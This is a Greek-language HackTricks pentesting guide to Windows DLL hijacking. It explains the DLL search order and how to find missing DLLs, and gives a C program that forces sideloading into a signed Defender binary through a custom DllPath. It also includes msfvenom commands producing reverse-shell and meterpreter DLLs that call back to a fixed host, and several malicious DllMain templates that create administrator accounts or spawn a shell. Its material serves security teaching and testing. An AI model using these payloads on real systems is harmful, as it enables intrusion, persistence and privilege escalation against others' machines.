# Dll Hijacking

{{#include ../../banners/hacktricks-training.md}}



## Βασικές Πληροφορίες

DLL Hijacking περιλαμβάνει τη χειραγώγηση μιας αξιόπιστης εφαρμογής ώστε να φορτώσει μια κακόβουλη DLL. Ο όρος αυτός περιλαμβάνει αρκετές τακτικές όπως **DLL Spoofing, Injection, and Side-Loading**. Χρησιμοποιείται κυρίως για εκτέλεση κώδικα, επίτευξη persistence, και, λιγότερο συχνά, privilege escalation. Παρά την εστίαση στην escalation εδώ, η μέθοδος hijacking παραμένει ίδια ανεξαρτήτως στόχου.

### Συνηθισμένες Τεχνικές

Χρησιμοποιούνται διάφορες μέθοδοι για DLL hijacking, η κάθε μία με την αποτελεσματικότητά της ανάλογα με τη στρατηγική φόρτωσης DLL της εφαρμογής:

1. **DLL Replacement**: Αντικατάσταση μιας γνήσιας DLL με μια κακόβουλη, προαιρετικά χρησιμοποιώντας DLL Proxying για διατήρηση της λειτουργικότητας της αρχικής DLL.
2. **DLL Search Order Hijacking**: Τοποθέτηση της κακόβουλης DLL σε διαδρομή αναζήτησης πριν από την νόμιμη, εκμεταλλευόμενοι το πρότυπο αναζήτησης της εφαρμογής.
3. **Phantom DLL Hijacking**: Δημιουργία μιας κακόβουλης DLL για μια εφαρμογή που νομίζει ότι πρόκειται για μη-υπάρχουσα απαιτούμενη DLL.
4. **DLL Redirection**: Τροποποίηση παραμέτρων αναζήτησης όπως το %PATH% ή αρχεία .exe.manifest / .exe.local για να κατευθύνουν την εφαρμογή στην κακόβουλη DLL.
5. **WinSxS DLL Replacement**: Αντικατάσταση της νόμιμης DLL με κακόβουλη στο WinSxS directory, μέθοδος που συχνά σχετίζεται με DLL side-loading.
6. **Relative Path DLL Hijacking**: Τοποθέτηση της κακόβουλης DLL σε directory ελεγχόμενο από τον χρήστη μαζί με την αντιγραμμένη εφαρμογή, μοιάζοντας με τεχνικές Binary Proxy Execution.

## Εύρεση ελλειπόντων Dlls

Ο πιο κοινός τρόπος για να βρείτε ελλείποντα Dlls μέσα σε ένα σύστημα είναι να τρέξετε [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) από sysinternals, **ρυθμίζοντας** τα **εξής 2 φίλτρα**:

![](<../../images/image (311).png>)

![](<../../images/image (313).png>)

και να εμφανίσετε μόνο την **File System Activity**:

![](<../../images/image (314).png>)

Αν ψάχνετε για **missing dlls γενικά**, αφήνετε αυτό να τρέχει για μερικά **seconds**.\
Αν ψάχνετε για ένα **missing dll μέσα σε ένα συγκεκριμένο εκτελέσιμο**, πρέπει να βάλετε **άλλο φίλτρο** όπως "Process Name" "contains" "\<exec name>", να το εκτελέσετε, και να σταματήσετε την καταγραφή συμβάντων.

## Εκμετάλλευση ελλειπόντων Dlls

Για να escalate privileges, η καλύτερη ευκαιρία είναι να μπορέσουμε να **γράψουμε μια dll που μια privileged διαδικασία θα προσπαθήσει να φορτώσει** σε κάποια από τις θέσεις όπου θα γίνει η αναζήτηση. Επομένως, θα μπορέσουμε να **γράψουμε** μια dll σε έναν **φάκελο** όπου η dll αναζητείται **πριν** από τον φάκελο που βρίσκεται η **αρχική dll** (παράξενο σενάριο), ή θα μπορέσουμε να γράψουμε σε κάποιο φάκελο όπου η dll αναζητείται και η αρχική **dll δεν υπάρχει** σε κανέναν φάκελο.

### Σειρά Αναζήτησης Dll

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

Οι εφαρμογές Windows αναζητούν DLLs ακολουθώντας μια σειρά από **προκαθορισμένες διαδρομές αναζήτησης**, σε μια συγκεκριμένη αλληλουχία. Το πρόβλημα του DLL hijacking προκύπτει όταν μια κακόβουλη DLL τοποθετείται στρατηγικά σε μια από αυτές τις καταχωρίσεις, εξασφαλίζοντας ότι θα φορτωθεί πριν από την αυθεντική DLL. Μια λύση για να το αποτρέψετε είναι να διασφαλίσετε ότι η εφαρμογή χρησιμοποιεί absolute paths όταν αναφέρεται στις DLL που χρειάζεται.

Μπορείτε να δείτε την **DLL search order σε 32-bit** συστήματα παρακάτω:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Αυτή είναι η **default** σειρά αναζήτησης με το **SafeDllSearchMode** ενεργοποιημένο. Όταν είναι απενεργοποιημένο, το current directory ανεβαίνει σε δεύτερη θέση. Για να απενεργοποιήσετε αυτή τη λειτουργία, δημιουργήστε την registry τιμή **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** και ορίστε την σε 0 (ενεργοποιημένο είναι το default).

Αν η [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) καλείται με **LOAD_WITH_ALTERED_SEARCH_PATH** η αναζήτηση ξεκινάει από τον φάκελο του executable module που **LoadLibraryEx** φορτώνει.

Τέλος, σημειώστε ότι **μια dll μπορεί να φορτωθεί υποδεικνύοντας το absolute path αντί μόνο το όνομα**. Σε αυτή την περίπτωση η dll θα αναζητηθεί **μόνο σε εκείνη τη διαδρομή** (αν η dll έχει εξαρτήσεις, αυτές θα αναζητηθούν όπως κάθε φορτωμένη dll με το όνομά της).

Υπάρχουν και άλλοι τρόποι για να αλλάξετε τη σειρά αναζήτησης αλλά δεν θα τους αναλύσω εδώ.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Ένας προχωρημένος τρόπος να επηρεάσετε ντετερμινιστικά το DLL search path μιας νεοδημιούργητης διαδικασίας είναι να ορίσετε το πεδίο DllPath στο RTL_USER_PROCESS_PARAMETERS όταν δημιουργείτε τη διαδικασία με τις native APIs του ntdll. Παρέχοντας εδώ έναν directory ελεγχόμενο από τον attacker, μια target διαδικασία που επιλύει μια imported DLL με το όνομα (χωρίς absolute path και χωρίς χρήση των safe loading flags) μπορεί να αναγκαστεί να φορτώσει μια κακόβουλη DLL από εκείνη τη διαδρομή.

Key idea
- Build the process parameters with RtlCreateProcessParametersEx and provide a custom DllPath that points to your controlled folder (e.g., the directory where your dropper/unpacker lives).
- Create the process with RtlCreateUserProcess. When the target binary resolves a DLL by name, the loader will consult this supplied DllPath during resolution, enabling reliable sideloading even when the malicious DLL is not colocated with the target EXE.

Notes/limitations
- This affects the child process being created; it is different from SetDllDirectory, which affects the current process only.
- The target must import or LoadLibrary a DLL by name (no absolute path and not using LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs and hardcoded absolute paths cannot be hijacked. Forwarded exports and SxS may change precedence.

Minimal C example (ntdll, wide strings, simplified error handling):
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
Operational usage example
- Τοποθετήστε ένα κακόβουλο xmllite.dll (που εξάγει τις απαιτούμενες συναρτήσεις ή λειτουργεί ως proxy προς το πραγματικό) στον φάκελο DllPath σας.
- Εκκινήστε ένα υπογεγραμμένο binary που είναι γνωστό ότι αναζητά το xmllite.dll με το όνομα χρησιμοποιώντας την παραπάνω τεχνική. Ο loader επιλύει την import μέσω του παρεχόμενου DllPath και sideloads το DLL σας.

Αυτή η τεχνική έχει παρατηρηθεί in-the-wild να οδηγεί σε αλυσιδωτές multi-stage sideloading αλυσίδες: ένας αρχικός launcher αποθέτει ένα helper DLL, το οποίο στη συνέχεια spawnάρει ένα Microsoft-signed, hijackable binary με custom DllPath για να εξαναγκάσει τη φόρτωση του DLL του επιτιθέμενου από έναν staging directory.


#### Exceptions on dll search order from Windows docs

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- Όταν συναντάται ένα **DLL που μοιράζεται το όνομά του με ένα που είναι ήδη φορτωμένο στη μνήμη**, το σύστημα παρακάμπτει την συνήθη αναζήτηση. Αντίθετα, πραγματοποιεί έλεγχο για redirection και manifest πριν καταλήξει στο DLL που είναι ήδη στη μνήμη. **Σε αυτό το σενάριο, το σύστημα δεν διεξάγει αναζήτηση για το DLL**.
- Σε περιπτώσεις όπου το DLL αναγνωρίζεται ως **known DLL** για την τρέχουσα έκδοση των Windows, το σύστημα θα χρησιμοποιήσει την έκδοση του known DLL, μαζί με οποιαδήποτε από τα dependent DLLs του, **παραλείποντας τη διαδικασία αναζήτησης**. Το registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** περιέχει λίστα αυτών των known DLLs.
- Εάν ένα **DLL έχει εξαρτήσεις**, η αναζήτηση για αυτά τα dependent DLLs διεξάγεται σαν να είχαν υποδειχθεί μόνο από τα **module names**, ανεξάρτητα από το αν το αρχικό DLL είχε εντοπιστεί μέσω πλήρους διαδρομής.

### Escalating Privileges

**Requirements**:

- Εντοπίστε μια διεργασία που λειτουργεί ή θα λειτουργήσει με **διαφορετικά privileges** (horizontal ή lateral movement), η οποία **δεν διαθέτει ένα DLL**.
- Βεβαιωθείτε ότι υπάρχει **write access** σε οποιονδήποτε **directory** στον οποίο θα **αναζητηθεί** το **DLL**. Αυτή η τοποθεσία μπορεί να είναι ο φάκελος του εκτελέσιμου ή ένας φάκελος εντός του system path.

Ναι, οι προϋποθέσεις είναι δύσκολες στον εντοπισμό καθώς **εξ ορισμού είναι περίεργο να βρεις ένα privileged executable που του λείπει ένα dll** και είναι ακόμη **πιο περίεργο να έχεις write permissions σε έναν φάκελο του system path** (συνήθως δεν μπορείς). Αλλά, σε misconfigured environments αυτό είναι εφικτό.\
Σε περίπτωση που είστε τυχεροί και πληροίτε τις προϋποθέσεις, μπορείτε να ελέγξετε το project [UACME](https://github.com/hfiref0x/UACME). Ακόμη και αν ο **κύριος στόχος του project είναι το bypass του UAC**, μπορεί να βρείτε εκεί ένα **PoC** για Dll hijacking για την έκδοση των Windows που μπορείτε να χρησιμοποιήσετε (πιθανόν απλώς αλλάζοντας τη διαδρομή του φακέλου στον οποίο έχετε write permissions).

Σημειώστε ότι μπορείτε να **ελέγξετε τα δικαιώματά σας σε έναν φάκελο** κάνοντας:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Και **έλεγξε τα δικαιώματα όλων των φακέλων μέσα στο PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Μπορείτε επίσης να ελέγξετε τα imports ενός executable και τα exports μιας dll με:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Για πλήρη οδηγό σχετικά με το πώς να **καταχρηστικά χρησιμοποιήσετε Dll Hijacking για να αυξήσετε προνόμια** όταν έχετε δικαιώματα εγγραφής σε έναν **System Path folder**, δείτε:


{{#ref}}
dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

### Αυτοματοποιημένα εργαλεία

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) θα ελέγξει αν έχετε δικαιώματα εγγραφής σε οποιονδήποτε φάκελο μέσα στο system PATH.\
Άλλα ενδιαφέροντα αυτοματοποιημένα εργαλεία για την ανακάλυψη αυτής της ευπάθειας είναι οι **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ και _Write-HijackDll._

### Παράδειγμα

Σε περίπτωση που βρείτε ένα εκμεταλλεύσιμο σενάριο, ένα από τα πιο σημαντικά πράγματα για να το εκμεταλλευτείτε επιτυχώς είναι να **δημιουργήσετε ένα dll που εξάγει τουλάχιστον όλες τις συναρτήσεις που το εκτελέσιμο θα εισάγει από αυτό**. Παρεμπιπτόντως, σημειώστε ότι το Dll Hijacking είναι χρήσιμο για να [escalate from Medium Integrity level to High **(bypassing UAC)**](../authentication-credentials-uac-and-efs.md#uac) ή από [**High Integrity to SYSTEM**](#from-high-integrity-to-system)**.** Μπορείτε να βρείτε ένα παράδειγμα του **πώς να δημιουργήσετε ένα έγκυρο dll** μέσα σε αυτή τη μελέτη για dll hijacking εστιασμένη σε dll hijacking για εκτέλεση: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Επιπλέον, στην **επόμενη ενότητα** μπορείτε να βρείτε μερικούς **βασικούς κώδικες dll** που μπορεί να είναι χρήσιμοι ως **πρότυπα** ή για να δημιουργήσετε ένα **dll με εξαγόμενες μη απαραίτητες συναρτήσεις**.

## **Δημιουργία και μεταγλώττιση Dlls**

### **Dll Proxifying**

Βασικά, ένας Dll proxy είναι ένα Dll ικανό να εκτελέσει τον κακόβουλο κώδικά σας όταν φορτώνεται, αλλά και να εκθέτει και να λειτουργεί όπως αναμένεται προωθώντας όλες τις κλήσεις στη πραγματική βιβλιοθήκη.

Με το εργαλείο [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ή [**Spartacus**](https://github.com/Accenture/Spartacus) μπορείτε στην ουσία να υποδείξετε ένα εκτελέσιμο και να επιλέξετε τη βιβλιοθήκη που θέλετε να proxify και να δημιουργήσετε ένα proxified dll ή να υποδείξετε το Dll και να δημιουργήσετε ένα proxified dll.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Αποκτήστε ένα meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Δημιουργήστε έναν χρήστη (x86 δεν είδα έκδοση x64):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Δικό σας

Σημειώστε ότι σε αρκετές περιπτώσεις το Dll που θα μεταγλωττίσετε πρέπει να **εξάγει αρκετές συναρτήσεις** που πρόκειται να φορτωθούν από τη διεργασία-θύμα. Αν αυτές οι συναρτήσεις δεν υπάρχουν, το **binary δεν θα μπορεί να τις φορτώσει** και το **exploit θα αποτύχει**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## Αναφορές

- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)



- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)


{{#include ../../banners/hacktricks-training.md}}
